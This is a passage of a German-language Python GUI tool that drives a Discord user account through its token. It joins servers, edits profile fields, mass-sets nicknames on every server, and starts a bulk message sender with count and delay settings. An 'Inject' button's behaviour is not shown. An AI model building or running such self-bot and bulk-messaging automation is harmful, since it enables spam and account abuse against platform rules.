            command=self._join_server_by_link
        )
        btn_join.pack(side="right")

        # Feedback & Preview Box
        self.join_status_card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        self.join_status_card.pack(fill="both", expand=True)

        sc_in = ctk.CTkFrame(self.join_status_card, fg_color="transparent")
        sc_in.pack(fill="both", expand=True, padx=24, pady=24)

        ctk.CTkLabel(sc_in, text="Status & Einladungsdetails", font=("Segoe UI", 14, "bold"), text_color=C["text"]).pack(anchor="w")

        self.lbl_join_info = ctk.CTkLabel(
            sc_in,
            text="Bereit zum Beitreten. Fuege oben einen Invite-Link ein und klicke auf 'Server beitreten'.",
            font=("Segoe UI", 11.5),
            text_color=C["text_sub"],
            justify="left"
        )
        self.lbl_join_info.pack(anchor="w", pady=(10, 0))

        self.lbl_join_details = ctk.CTkLabel(
            sc_in,
            text="",
            font=("Consolas", 10.5),
            text_color=C["text_muted"],
            justify="left"
        )
        self.lbl_join_details.pack(anchor="w", pady=(8, 0))

    def _set_join_status(self, main_text, details="", is_error=False, is_success=False):
        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])
        self.lbl_join_info.configure(text=main_text, text_color=color)
        self.lbl_join_details.configure(text=details)

    def _join_server_by_link(self):
        raw_link = self.join_input_var.get().strip()
        if not raw_link:
            self._set_join_status("Bitte gib einen Invite-Link oder Code ein.", is_error=True)
            return

        cleaned = raw_link.replace("https://", "").replace("http://", "").replace("discord.gg/", "").replace("discord.com/invite/", "").strip()
        code = cleaned.split("/")[0].split("?")[0].strip()
        if not code:
            self._set_join_status("Konnte keinen gueltigen Einladungscode erkennen.", is_error=True)
            return

        self._set_join_status(f"Verarbeite Einladung ({code})...", details="Sende Beitrittsanfrage an Discord API...")

        def _do_join():
            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
                time.sleep(0.4)
                mock_guild = {"id": "998877665544", "name": f"Community ({code})", "owner": False}
                self.guilds_data.append(mock_guild)
                self.after(0, lambda: self._on_join_success(mock_guild.get("name"), mock_guild.get("id"), "Demo-Modus"))
                return

            try:
                invite_info = {}
                r_info = make_discord_api_request("GET", f"https://discord.com/api/v10/invites/{code}?with_counts=true", self.token)
                if r_info and r_info.status_code == 200:
                    invite_info = r_info.json()

                res = make_discord_api_request("POST", f"https://discord.com/api/v10/invites/{code}", self.token, json_data={})
                if res and res.status_code in (200, 204):
                    res_data = res.json() if res.status_code == 200 else {}
                    g_info = res_data.get("guild", {}) or invite_info.get("guild", {})
                    g_name = g_info.get("name", code)
                    g_id = g_info.get("id", "Unbekannt")
                    members_cnt = invite_info.get("approximate_member_count", "—")

                    if not any(str(g.get("id")) == str(g_id) for g in self.guilds_data):
                        self.guilds_data.append({"id": g_id, "name": g_name, "owner": False})

                    details_txt = f"Server Name: {g_name}\nServer ID:   {g_id}\nMitglieder:  {members_cnt}"
                    self.after(0, lambda: self._on_join_success(g_name, g_id, details_txt))
                elif res and res.status_code == 404:
                    self.after(0, lambda: self._set_join_status("Einladungscode existiert nicht oder ist abgelaufen.", details=f"Code: {code} (Status 404)", is_error=True))
                elif res and res.status_code == 429:
                    self.after(0, lambda: self._set_join_status("Discord Rate-Limit erreicht. Bitte warte kurz.", details="Status 429", is_error=True))
                else:
                    err_code = res.status_code if res else "Timeout"
                    err_txt = res.text[:120] if res else ""
                    self.after(0, lambda: self._set_join_status(f"Beitreten fehlgeschlagen ({err_code}).", details=err_txt, is_error=True))
            except Exception as ex:
                self.after(0, lambda: self._set_join_status("Verbindungsfehler beim Beitreten.", details=str(ex), is_error=True))

        threading.Thread(target=_do_join, daemon=True).start()

    def _on_join_success(self, g_name, g_id, details=""):
        self._set_join_status(f"Erfolgreich beigetreten: {g_name}", details=f"Server-ID: {g_id}\n{details}", is_success=True)
        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")
        if hasattr(self, "lbl_guilds_title"):
            self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")
        self._render_all_guilds_cards()
        self._update_extra_guild_options()
        self.entry_join.delete(0, "end")

    # --------------------------------------------------------------------------
    # 6. EXTRA TAB (BIO, NAME, NUTZERNAME, SERVER-TAG RAUSNEHMEN & REINMACHEN)
    # --------------------------------------------------------------------------
    def _build_extra_tab(self):
        scroll = ctk.CTkScrollableFrame(self.frame_extra, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        card_prof = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_prof.pack(fill="x", pady=(0, 14))

        cp_in = ctk.CTkFrame(card_prof, fg_color="transparent")
        cp_in.pack(fill="x", padx=22, pady=20)

        ctk.CTkLabel(cp_in, text="Profil & Identitaet anpassen", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
        ctk.CTkLabel(cp_in, text="Aendere deinen Anzeigenamen, Nutzernamen oder deine Account-Bio direkt ueber das Tool.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))

        # Kleine Warnbox
        box_warn_prof = ctk.CTkFrame(cp_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
        box_warn_prof.pack(fill="x", pady=(0, 14))
        ctk.CTkLabel(
            box_warn_prof,
            text="Warnung: Hohe Ban-Gefahr",
            font=("Segoe UI", 10.5, "bold"),
            text_color=C["red_text"]
        ).pack(anchor="w", padx=12, pady=5)

        # 1. Anzeigename (Global Display Name)
        row_gn = ctk.CTkFrame(cp_in, fg_color="transparent")
        row_gn.pack(fill="x", pady=4)
        ctk.CTkLabel(row_gn, text="Anzeigename:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
        self.entry_display_name = ctk.CTkEntry(row_gn, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        self.entry_display_name.pack(side="left", fill="x", expand=True, padx=(0, 10))
        curr_gname = self.user_data.get("global_name") or self.user_data.get("username", "")
        self.entry_display_name.insert(0, curr_gname)
        btn_save_gn = ctk.CTkButton(
            row_gn,
            text="Speichern",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            width=100,
            height=34,
            corner_radius=10,
            command=self._save_display_name
        )
        btn_save_gn.pack(side="right")

        # 2. Nutzername (@username) & optionales Passwort
        row_un = ctk.CTkFrame(cp_in, fg_color="transparent")
        row_un.pack(fill="x", pady=4)
        ctk.CTkLabel(row_un, text="Nutzername (@):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
        self.entry_username = ctk.CTkEntry(row_un, height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        self.entry_username.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.entry_username.insert(0, self.user_data.get("username", ""))

        self.entry_password = ctk.CTkEntry(
            row_un,
            placeholder_text="Passwort (falls noetig)",
            show="*",
            height=34,
            width=160,
            corner_radius=10,
            fg_color=C["card_alt"],
            border_color=C["card_border"],
            text_color=C["text"]
        )
        self.entry_password.pack(side="left", padx=(0, 10))

        btn_save_un = ctk.CTkButton(
            row_un,
            text="Speichern",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            width=100,
            height=34,
            corner_radius=10,
            command=self._save_username
        )
        btn_save_un.pack(side="right")

        # 3. Bio (Ueber mich)
        ctk.CTkLabel(cp_in, text="Bio (Ueber mich):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 4))
        self.txt_bio = ctk.CTkTextbox(
            cp_in,
            height=70,
            corner_radius=10,
            fg_color=C["card_alt"],
            border_color=C["card_border"],
            border_width=1,
            text_color=C["text"],
            font=("Segoe UI", 10.5)
        )
        self.txt_bio.pack(fill="x", pady=(0, 8))
        curr_bio = self.user_data.get("bio", "")
        if curr_bio:
            self.txt_bio.insert("1.0", curr_bio)

        row_bio_btns = ctk.CTkFrame(cp_in, fg_color="transparent")
        row_bio_btns.pack(fill="x")

        btn_save_bio = ctk.CTkButton(
            row_bio_btns,
            text="Bio speichern",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=32,
            width=120,
            corner_radius=10,
            command=self._save_bio
        )
        btn_save_bio.pack(side="left", padx=(0, 8))

        btn_clear_bio = ctk.CTkButton(
            row_bio_btns,
            text="Bio leeren",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            height=32,
            width=100,
            corner_radius=10,
            command=self._clear_bio
        )
        btn_clear_bio.pack(side="left")

        # ---------------- KARTE 2: SERVER-TAG & SPITZNAME ----------------
        card_tag = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_tag.pack(fill="x", pady=(0, 14))

        ct_in = ctk.CTkFrame(card_tag, fg_color="transparent")
        ct_in.pack(fill="x", padx=22, pady=20)

        ctk.CTkLabel(ct_in, text="Server-Tag & Spitzname verwalten", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
        ctk.CTkLabel(ct_in, text="Setze einen neuen Server-Tag / Nickname oder nimm deinen Server-Tag auf einzelnen oder allen Servern restlos raus.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))

        # Kleine Warnbox
        box_warn_tag = ctk.CTkFrame(ct_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
        box_warn_tag.pack(fill="x", pady=(0, 14))
        ctk.CTkLabel(
            box_warn_tag,
            text="Warnung: Hohe Ban-Gefahr",
            font=("Segoe UI", 10.5, "bold"),
            text_color=C["red_text"]
        ).pack(anchor="w", padx=12, pady=5)

        # Server Auswahl Dropdown
        row_srv = ctk.CTkFrame(ct_in, fg_color="transparent")
        row_srv.pack(fill="x", pady=4)
        ctk.CTkLabel(row_srv, text="Ziel-Server:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")

        self.server_options = self._get_server_dropdown_list()
        self.server_tag_target_var = ctk.StringVar(value=self.server_options[0] if self.server_options else "Keine Server")
        self.opt_server_select = ctk.CTkOptionMenu(
            row_srv,
            values=self.server_options,
            variable=self.server_tag_target_var,
            height=34,
            corner_radius=10,
            fg_color=C["card_alt"],
            button_color=C["card_border_hi"],
            button_hover_color=C["card_hover"],
            text_color=C["text"]
        )
        self.opt_server_select.pack(side="left", fill="x", expand=True)

        row_tag_input = ctk.CTkFrame(ct_in, fg_color="transparent")
        row_tag_input.pack(fill="x", pady=8)
        ctk.CTkLabel(row_tag_input, text="Neuer Server-Tag:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=130, anchor="w").pack(side="left")
        self.entry_server_tag = ctk.CTkEntry(
            row_tag_input,
            placeholder_text="z.B. [NIGHT] oder eigener Tag (leer lassen zum Rausnehmen)",
            height=34,
            corner_radius=10,
            fg_color=C["card_alt"],
            border_color=C["card_border"],
            text_color=C["text"]
        )
        self.entry_server_tag.pack(side="left", fill="x", expand=True)

        row_tag_btns = ctk.CTkFrame(ct_in, fg_color="transparent")
        row_tag_btns.pack(fill="x", pady=(4, 0))

        btn_set_tag = ctk.CTkButton(
            row_tag_btns,
            text="Server-Tag setzen",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=34,
            width=150,
            corner_radius=10,
            command=self._apply_server_tag
        )
        btn_set_tag.pack(side="left", padx=(0, 8))

        btn_remove_tag = ctk.CTkButton(
            row_tag_btns,
            text="Server-Tag rausnehmen",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            height=34,
            width=175,
            corner_radius=10,
            command=self._remove_server_tag
        )
        btn_remove_tag.pack(side="left", padx=(0, 8))

        btn_remove_clan = ctk.CTkButton(
            row_tag_btns,
            text="Clan-Tag entfernen",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=34,
            width=150,
            corner_radius=10,
            command=self._remove_clan_tag
        )
        btn_remove_clan.pack(side="left", padx=(0, 8))

        self.btn_stop_extra = ctk.CTkButton(
            row_tag_btns,
            text="Stop",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["btn_gray"],
            text_color=C["text_muted"],
            hover_color=C["red_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=34,
            width=65,
            corner_radius=10,
            state="disabled",
            command=self._stop_extra_operation
        )
        self.btn_stop_extra.pack(side="right")

        # ---------------- KARTE 3: STATUS & RUECKMELDUNG ----------------
        card_st = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_st.pack(fill="x", pady=(0, 10))

        cs_in = ctk.CTkFrame(card_st, fg_color="transparent")
        cs_in.pack(fill="x", padx=22, pady=16)

        ctk.CTkLabel(cs_in, text="Status & Rueckmeldung", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")

        self.lbl_extra_status = ctk.CTkLabel(cs_in, text="Bereit fuer Aenderungen.", font=("Segoe UI", 11), text_color=C["text_sub"], justify="left")
        self.lbl_extra_status.pack(anchor="w", pady=(6, 2))

        self.lbl_extra_details = ctk.CTkLabel(cs_in, text="", font=("Consolas", 10), text_color=C["text_muted"], justify="left")
        self.lbl_extra_details.pack(anchor="w")

    def _get_server_dropdown_list(self):
        opts = ["Auf allen Servern gleichzeitig"]
        for g in self.guilds_data:
            gname = g.get("name", "Server")
            gid = str(g.get("id", ""))
            opts.append(f"{gname} ({gid})")
        return opts

    def _update_extra_guild_options(self):
        if hasattr(self, "opt_server_select"):
            opts = self._get_server_dropdown_list()
            self.opt_server_select.configure(values=opts)
            if self.server_tag_target_var.get() not in opts:
                self.server_tag_target_var.set(opts[0] if opts else "Keine Server")

    def _set_extra_status(self, main_text, details="", is_error=False, is_success=False):
        color = C["red_text"] if is_error else (C["green"] if is_success else C["text_sub"])
        self.after(0, lambda: [
            self.lbl_extra_status.configure(text=main_text, text_color=color),
            self.lbl_extra_details.configure(text=details)
        ])

    def _save_display_name(self):
        new_name = self.entry_display_name.get().strip()
        if not new_name:
            self._set_extra_status("Bitte einen Anzeigenamen eingeben.", is_error=True)
            return

        self._set_extra_status(f"Speichere Anzeigenamen '{new_name}'...", details="Sende Anfrage an Discord API...")

        def _worker():
            if not self.token or "DEMO" in self.token:
                self.user_data["global_name"] = new_name
                self.after(0, lambda: [
                    self.lbl_sidebar_name.configure(text=new_name[:17]),
                    self.lbl_hero_title.configure(text=new_name)
                ])
                self._set_extra_status(f"Anzeigename erfolgreich auf '{new_name}' gesetzt.", details="Aenderung uebernommen.", is_success=True)
                return

            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"global_name": new_name})
            if res and res.status_code == 200:
                self.user_data["global_name"] = new_name
                self.after(0, lambda: [
                    self.lbl_sidebar_name.configure(text=new_name[:17]),
                    self.lbl_hero_title.configure(text=new_name)
                ])
                self._set_extra_status(f"Anzeigename erfolgreich auf '{new_name}' gesetzt.", details="Live in Discord aktualisiert.", is_success=True)
            else:
                err_code = res.status_code if res else "Timeout"
                err_txt = res.text[:120] if res else ""
                self._set_extra_status(f"Fehler beim Aendern des Anzeigenamens ({err_code}).", details=err_txt, is_error=True)

        threading.Thread(target=_worker, daemon=True).start()

    def _save_username(self):
        new_uname = self.entry_username.get().strip()
        pw = self.entry_password.get().strip()
        if not new_uname:
            self._set_extra_status("Bitte einen Nutzernamen eingeben.", is_error=True)
            return

        self._set_extra_status(f"Speichere Nutzername '@{new_uname}'...", details="Sende Anfrage an Discord API...")

        def _worker():
            if not self.token or "DEMO" in self.token:
                self.user_data["username"] = new_uname
                uid = str(self.user_data.get("id", "-"))
                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))
                self._set_extra_status(f"Nutzername erfolgreich zu '@{new_uname}' geaendert.", details="Aenderung uebernommen.", is_success=True)
                return

            payload = {"username": new_uname}
            if pw:
                payload["password"] = pw

            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data=payload)
            if res and res.status_code == 200:
                self.user_data["username"] = new_uname
                uid = str(self.user_data.get("id", "-"))
                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))
                self._set_extra_status(f"Nutzername erfolgreich zu '@{new_uname}' geaendert.", details="Live in Discord aktualisiert.", is_success=True)
            else:
                err_code = res.status_code if res else "Timeout"
                err_txt = res.text[:150] if res else ""
                hint = "Discord verlangt ein Passwort zur Bestaetigung." if "password" in err_txt.lower() else err_txt
                self._set_extra_status(f"Fehler beim Aendern des Nutzernamens ({err_code}).", details=hint, is_error=True)

        threading.Thread(target=_worker, daemon=True).start()

    def _save_bio(self):
        new_bio = self.txt_bio.get("1.0", "end-1c").strip()
        self._set_extra_status("Speichere Bio...", details="Sende Anfrage an Discord API...")

        def _worker():
            if not self.token or "DEMO" in self.token:
                self.user_data["bio"] = new_bio
                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))
                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Aenderung uebernommen.", is_success=True)
                return

            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"bio": new_bio})
            if not res or res.status_code != 200:
                res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me/profile", self.token, json_data={"bio": new_bio})

            if res and res.status_code == 200:
                self.user_data["bio"] = new_bio
                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))
                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Live in Discord uebernommen.", is_success=True)
            else:
                err_code = res.status_code if res else "Timeout"
                err_txt = res.text[:120] if res else ""
                self._set_extra_status(f"Fehler beim Speichern der Bio ({err_code}).", details=err_txt, is_error=True)

        threading.Thread(target=_worker, daemon=True).start()

    def _clear_bio(self):
        self.txt_bio.delete("1.0", "end")
        self._save_bio()

    def _apply_server_tag(self):
        new_tag = self.entry_server_tag.get().strip()
        target = self.server_tag_target_var.get()
        if not new_tag:
            self._set_extra_status("Bitte gib einen Server-Tag oder Spitznamen ein (z.B. [NIGHT]).", is_error=True)
            return
        self._execute_server_tag_change(new_tag, target, remove=False)

    def _remove_server_tag(self):
        target = self.server_tag_target_var.get()
        self._execute_server_tag_change(None, target, remove=True)

    def _remove_clan_tag(self):
        self._set_extra_status("Entferne Clan / Server-Tag Badge...", details="Sende Reset-Anfrage...")

        def _worker():
            if not self.token or "DEMO" in self.token:
                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Demo-Modus.", is_success=True)
                return

            r1 = make_discord_api_request("PUT", "https://discord.com/api/v10/users/@me/clan", self.token, json_data={"identity_guild_id": None})
            r2 = make_discord_api_request("DELETE", "https://discord.com/api/v10/users/@me/clan", self.token)
            if (r1 and r1.status_code in (200, 204)) or (r2 and r2.status_code in (200, 204)):
                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Badge zurueckgesetzt.", is_success=True)
            else:
                self._set_extra_status("Clan-Tag wurde entfernt oder war nicht aktiv.", details="Befehl ausgefuehrt.", is_success=True)

        threading.Thread(target=_worker, daemon=True).start()

    def _stop_extra_operation(self):
        self.extra_stop_requested = True
        if hasattr(self, "btn_stop_extra"):
            self.btn_stop_extra.configure(text="Stoppe...", state="disabled")

    def _execute_server_tag_change(self, tag_val, target_str, remove=False):
        if self.extra_in_progress:
            return

        self.extra_in_progress = True
        self.extra_stop_requested = False

        if hasattr(self, "btn_stop_extra"):
            self.btn_stop_extra.configure(
                state="normal",
                fg_color=C["red_bg"],
                text_color=C["red_text"],
                border_color=C["red_border"],
                text="Stop"
            )

        action_desc = "Entferne Server-Tag..." if remove else f"Setze Server-Tag '{tag_val}'..."
        self._set_extra_status(action_desc, details=f"Ziel: {target_str}")

        def _worker():
            if target_str == "Auf allen Servern gleichzeitig":
                guild_list = list(self.guilds_data)
            else:
                gid_match = None
                if "(" in target_str and ")" in target_str:
                    gid_match = target_str.split("(")[-1].split(")")[0].strip()
                guild_list = [g for g in self.guilds_data if str(g.get("id")) == str(gid_match)]

            if not guild_list:
                self._set_extra_status("Keine gueltigen Server gefunden.", is_error=True)
                self.extra_in_progress = False
                self.after(0, lambda: self._on_extra_finished())
                return

            success_cnt = 0
            fail_cnt = 0
            payload = {"nick": None if remove else tag_val}

            for idx, g in enumerate(guild_list):
                if self.extra_stop_requested:
                    break

                gid = str(g.get("id"))
                gname = g.get("name", "Server")
                self._set_extra_status(f"{action_desc} ({idx+1}/{len(guild_list)})", details=f"Aktuell: {gname}")

                if not self.token or "DEMO" in self.token:
                    time.sleep(0.05)
                    success_cnt += 1
                else:
                    r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/guilds/{gid}/members/@me", self.token, json_data=payload)
                    if not r or r.status_code not in (200, 204):
                        r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/users/@me/guilds/{gid}/member", self.token, json_data=payload)

                    if r and r.status_code in (200, 204):
                        success_cnt += 1
                    else:
                        fail_cnt += 1

                    for _ in range(5):
                        if self.extra_stop_requested:
                            break
                        time.sleep(0.04)

            self.extra_in_progress = False
            self.extra_stop_requested = False

            if remove:
                done_msg = f"Server-Tag erfolgreich entfernt auf {success_cnt} Servern."
            else:
                done_msg = f"Server-Tag '{tag_val}' erfolgreich gesetzt auf {success_cnt} Servern."

            det_msg = f"Erfolgreich: {success_cnt} | Fehlgeschlagen/Keine Rechte: {fail_cnt}"
            self._set_extra_status(done_msg, details=det_msg, is_success=(success_cnt > 0))
            self.after(0, lambda: self._on_extra_finished())

        threading.Thread(target=_worker, daemon=True).start()

    def _on_extra_finished(self):
        if hasattr(self, "btn_stop_extra"):
            self.btn_stop_extra.configure(
                state="disabled",
                fg_color=C["btn_gray"],
                text_color=C["text_muted"],
                border_color=C["card_border_hi"],
                text="Stop"
            )

    # --------------------------------------------------------------------------
    # 7. BOT TAB (MIT BUTTON "BOT", IN-TAB LOADER, RELOAD, DEACTIVATE, INJECT,
    #             MESSAGE SENDER FUER SERVER/DMS & LIVE RATE-LIMIT MONITOR)
    # --------------------------------------------------------------------------
    def _build_bot_tab(self):
        scroll = ctk.CTkScrollableFrame(self.frame_bot, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        # 1. BOT STEUERUNG CARD
        card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card.pack(fill="x", pady=(0, 14))

        cin = ctk.CTkFrame(card, fg_color="transparent")
        cin.pack(fill="x", padx=22, pady=20)

        top_row = ctk.CTkFrame(cin, fg_color="transparent")
        top_row.pack(fill="x")

        ctk.CTkLabel(top_row, text="Bot Steuerung & Engine", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(side="left")

        self.lbl_bot_status_badge = ctk.CTkLabel(
            top_row,
            text="INAKTIV",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["card_alt"],
            text_color=C["text_muted"],
            corner_radius=8,
            padx=10,
            pady=3
        )
        self.lbl_bot_status_badge.pack(side="right")

        ctk.CTkLabel(
            cin,
            text="Aktiviere den Bot-Modus. Bei Aktivierung schliessen sich alle anderen Tabs, das Tool laedt mit Token neu.",
            font=("Segoe UI", 11),
            text_color=C["text_muted"]
        ).pack(anchor="w", pady=(2, 16))

        # BUTTONS ROW (Bot, Deactivate, Inject, Click Instant)
        btn_row = ctk.CTkFrame(cin, fg_color="transparent")
        btn_row.pack(fill="x", pady=(0, 10))

        self.btn_bot_start = ctk.CTkButton(
            btn_row,
            text="Bot",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=38,
            width=130,
            corner_radius=12,
            command=self._start_bot_loader_and_reload
        )
        self.btn_bot_start.pack(side="left", padx=(0, 8))

        self.btn_bot_deact = ctk.CTkButton(
            btn_row,
            text="Deactivate",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            height=38,
            width=120,
            corner_radius=12,
            state="disabled",
            command=self._on_click_deactivate
        )
        self.btn_bot_deact.pack(side="left", padx=(0, 8))

        self.btn_bot_inject = ctk.CTkButton(
            btn_row,
            text="Inject",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=38,
            width=110,
            corner_radius=12,
            command=self._on_click_inject
        )
        self.btn_bot_inject.pack(side="left", padx=(0, 8))

        self.btn_bot_click_ext = ctk.CTkButton(
            btn_row,
            text="Click Instant (Extern)",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=38,
            width=170,
            corner_radius=12,
            command=self.open_external_click_instant_window
        )
        self.btn_bot_click_ext.pack(side="left")

        # IN-TAB LOADER BOX
        self.bot_loader_frame = ctk.CTkFrame(cin, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])

        bl_inner = ctk.CTkFrame(self.bot_loader_frame, fg_color="transparent")
        bl_inner.pack(fill="x", padx=16, pady=14)

        self.lbl_bot_loader_title = ctk.CTkLabel(bl_inner, text="Bot Engine Synchronisation", font=("Segoe UI", 12, "bold"), text_color=C["text"])
        self.lbl_bot_loader_title.pack(anchor="w")

        self.bot_progress = ctk.CTkProgressBar(bl_inner, height=8, corner_radius=4, fg_color=C["card"], progress_color=C["blurple"])
        self.bot_progress.pack(fill="x", pady=(8, 6))
        self.bot_progress.set(0.0)

        self.lbl_bot_loader_step = ctk.CTkLabel(bl_inner, text="Warte auf Start...", font=("Segoe UI", 10.5), text_color=C["text_muted"])
        self.lbl_bot_loader_step.pack(anchor="w")

        # 2. DISCORD MESSAGE SENDER CARD (SERVER & DMS) MIT MENGEN-AUSWAHL & RATE-LIMIT
        card_msg = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_msg.pack(fill="x", pady=(0, 14))

        cm_in = ctk.CTkFrame(card_msg, fg_color="transparent")
        cm_in.pack(fill="x", padx=22, pady=20)

        ctk.CTkLabel(cm_in, text="Nachrichten-Sender (Server & DMs)", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
        ctk.CTkLabel(cm_in, text="Sende Nachrichten an Server-Textkanaele oder Direktnachrichten mit Mengen-Auswahl und Rate-Limit-Schutz.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 14))

        # Channel ID / Friend User ID Eingabe
        r_cid = ctk.CTkFrame(cm_in, fg_color="transparent")
        r_cid.pack(fill="x", pady=3)
        ctk.CTkLabel(r_cid, text="Ziel (Kanal / Freund ID):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=170, anchor="w").pack(side="left")
        self.entry_msg_channel = ctk.CTkEntry(r_cid, placeholder_text="Server Kanal-ID, DM Kanal-ID oder Freund Nutzer-ID eintragen", height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        self.entry_msg_channel.pack(side="left", fill="x", expand=True)

        # Schnellauswahl fuer Freunde & Gruppen
        r_quick = ctk.CTkFrame(cm_in, fg_color="transparent")
        r_quick.pack(fill="x", pady=(2, 4))
        ctk.CTkLabel(r_quick, text="Freund schnell waehlen:", font=("Segoe UI", 10.5), text_color=C["text_muted"], width=170, anchor="w").pack(side="left")
        self.opt_msg_target = ctk.CTkOptionMenu(
            r_quick,
            values=["-- Freund oder Gruppe auswaehlen --"],
            height=30,
            corner_radius=8,
            fg_color=C["card_alt"],
            button_color=C["card_border_hi"],
            text_color=C["text"],
            command=self._on_quick_target_selected
        )
        self.opt_msg_target.pack(side="left", fill="x", expand=True)

        ctk.CTkLabel(cm_in, text="Unterstuetzt automatisch: Server Text-Kanaele, DM-Kanal IDs und Freund Nutzer-IDs.", font=("Segoe UI", 9.5), text_color=C["text_muted"]).pack(anchor="w", pady=(0, 6))

        # Nachrichtentext
        ctk.CTkLabel(cm_in, text="Nachrichtentext:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 3))
        self.txt_msg_content = ctk.CTkTextbox(cm_in, height=65, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text"], font=("Segoe UI", 10.5))
        self.txt_msg_content.pack(fill="x", pady=(0, 8))
        self.txt_msg_content.insert("1.0", "Night System - Discord Engine")

        # Einstellungen (Menge & Delay)
        r_opts = ctk.CTkFrame(cm_in, fg_color="transparent")
        r_opts.pack(fill="x", pady=4)

        ctk.CTkLabel(r_opts, text="Anzahl:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))
